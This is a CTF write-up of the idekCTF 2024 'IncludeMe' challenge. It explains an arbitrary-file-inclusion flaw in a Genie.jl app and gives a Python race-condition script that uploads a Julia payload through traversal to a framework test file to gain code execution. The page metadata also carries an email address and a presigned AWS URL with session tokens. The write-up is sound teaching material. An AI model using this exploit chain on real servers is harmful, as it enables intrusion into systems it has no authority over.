---
id: 476adce3-c249-4a2d-ad88-ea823a5c99a1
title: Arbitrary File Inclusion Leading to RCE in Genie.jl - IncludeMe [idekCTF 2024]
created_time: 2024-08-19T00:24:00.000Z
last_edited_time: 2024-09-28T00:27:00.000Z
cover_image: ./imgs/images_CYPDSAFZ
icon_emoji: 🏎️
categories: []
verification:
  state: unverified
  verified_by: null
  date: null
page: Arbitrary File Inclusion Leading to RCE in Genie.jl - IncludeMe [idekCTF 2024]
owner:
  - object: user
    id: ee7aeeeb-cd0d-4cbb-9e7e-109320ff16fa
    name: Dimas
    avatar_url: >-
      https://s3-us-west-2.amazonaws.com/public.notion-static.com/fab4bcf0-36ea-4bd6-8847-f18b157387da/92920739.png
    type: person
    person:
      email: dimasmaulana0305@gmail.com
_thumbnail: ./imgs/images_CYPDSAFZ

---

In idekCTF 2024, I played with the **P1G SEKAI** team and secured 1st place out of 1,068 teams! I solved a challenge named "Included me" and got the first blood on that challenge.

# Challenge Description

another minimalist, frontend-less, challenge because i'm bad at writing server-side challenges

[image](https://prod-files-secure.s3.us-west-2.amazonaws.com/39d1be85-e7c6-4263-a666-a42da95a70df/709a0b78-7ae2-4171-930b-e98c753c8621/includeme.tar.gz?X-Amz-Algorithm=AWS4-HMAC-SHA256\&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD\&X-Amz-Credential=ASIAZI2LB4664OIVERST%2F20250523%2Fus-west-2%2Fs3%2Faws4_request\&X-Amz-Date=20250523T091634Z\&X-Amz-Expires=3600\&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDEaCXVzLXdlc3QtMiJHMEUCICGUgNH61qR8kP1IPNc6ZBacxfuj%2FcLUH4PuSfeVZLdhAiEA0hION3YjaHzy7eIcqIg61%2BaJLknAN%2FIf2fn0eWjQwFAqiAQI6v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDHVBH%2F%2Fesh9pHQM9PCrcA30aJTbITTfaTYpktokx1ZD%2FeTT4iFCjqprvnIoXSIvy%2B5qJb7Ra06nINCUSGaIfazxjLsCF3y1h1YsBaNhsW2kqRGp3kSM%2BRWpZFWD3oZhelUd5gnC6slfhxp0h2ouUijTbmCvu%2BEzeDgPirH%2BQPa0hR%2Fndn3pIzaqSTNZOYkEJpurTAdgjvnXsP4UWHPIYEIDD3IS7G5VZaF1Bqp9%2FQ1EC6U56ei8UZJ5fJx4VbEEmVz2RkdLpJbjMDHFlAHjrKKRh08gu%2FDbRw0CJPQJogHbNQVUXhGvRP1Ad3%2BwCUK3q07B6V1a68L%2FBdK6ncycsgPbx%2FrqwJuUuDeJrE6XfUng7DBX2da0um2yF6T1Wyy5evS3Ji3r58BW8KENTUJgyYGKF4iUg1cKy3TdqaUBOLg9LLJLyNf2JJfvxaOHViI4fh%2BK0LQMoTI80z1QqqhhMGYYLDcAaiUUN3CrwhKZJwFYaCv2PS0d9R4M%2FxhKbdv7fyBBgFjEfiJSm6YKsrZ3QnE1aSeu1MFeqBtZR6olJs0G%2FzVStFTLh6juO1iIy5coBahWj7kOLPwQqJ38U3GTCvGR3vWJhaWuXw%2Bi01fGNqQaqgXTdQat74HRCJKdHEn7luG0Bhr6jTCYdNm6QMIHywMEGOqUBEA0MupIUbZZEUNDDjvvsO1oAxhZrFng4hvZ2G7qa%2F82yQukgo20h%2BEQJk72V7pS4nvmw%2F9mnd0VrLBRsx87toStFjSOJOysU%2Fq744XSmv9KmUgHgPC8TrF0y7ZhhKXBtniSYOoGuFvnKmn2xvfAiwJE5XphfSHQ2Dkbu17tfIgtnK9qNv8MxIkx4TkyXfu6uCmhBW0jGjluVgJ4WNaxEL6yRO1T9\&X-Amz-Signature=f8cacf4a72b6fe2335167e9ea3386edfbdef7661f29a473266153cd90f1abe7f\&X-Amz-SignedHeaders=host\&x-id=GetObject)

# How to Solve

The goal of this challenge was to achieve Remote Code Execution (RCE) and capture the flag. The program was vulnerable to arbitrary file inclusion here:

```julia
using Genie, Genie.Requests, Pkg

Pkg.activate(".")

index() = include(params(:page, "example.jl"))

route("/", index)

up(1337, "0.0.0.0", async = false)
```

We could include arbitrary files into the application, altering its flow. I discovered that we could include a test case from this Genie.jl repository:

> [![image](./imgs/b322ed80-bc5a-11e9-807a-9b53749c40ef_ftYlQyUC) **Genie.jl/test/fileuploads/test.jl at 509886d61a75d74bcbd45db1f77230abd4cd11a8 · GenieFramework/Genie.jl**](https://github.com/GenieFramework/Genie.jl/blob/509886d61a75d74bcbd45db1f77230abd4cd11a8/test/fileuploads/test.jl#L14)\
> 🧞The highly productive Julia web framework. Contribute to GenieFramework/Genie.jl development by creating an account on GitHub.\
> <https://github.com/GenieFramework/Genie.jl/blob/509886d61a75d74bcbd45db1f77230abd4cd11a8/test/fileuploads/test.jl#L14>

This test case essentially exposes a file upload vulnerability, allowing us to upload arbitrary files into Genie. However, after including that file, the program’s flow would change, preventing us from doing it a second time… or would it? The solution is yes, we can include it again if we’re fast enough to include `app.jl` right after uploading the file. This requires a race condition. Here's my solution script:

```python
import httpx
import asyncio

URL = "http://localhost:1337"
# URL = "https://includeme-295e03fffda9795f.instancer.idek.team/"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.AsyncClient(base_url=url, timeout=100)
    def page(self, page):
        return self.c.get("/", params={"page": page})
    def upload(self, fileupload):
        return self.c.post("/", files={"fileupload": ("x.jl", fileupload)})
class API(BaseAPI):
    ...

async def main():
    api = API()
    ress = []
    res1 = api.page("../home/ctf/.julia/packages/Genie/yQwwj/test/fileuploads/test.jl")
    ress.append(res1)
    for i in range(10):
        res2 = api.upload("""
read(`cat flag.txt`, String)
""")
        for j in range(10):
            res3 = api.page("app.jl")
            ress.append(res3)
        ress.extend([res1, res2])
    ress = await asyncio.gather(*ress)
    for res in ress:
        print(res.text)


if __name__ == "__main__":
    asyncio.run(main())

```

Next, visit <http://localhost:1337/?page=x.jl> to retrieve the flag.

![](./imgs/image_2FRbeU5K.png)
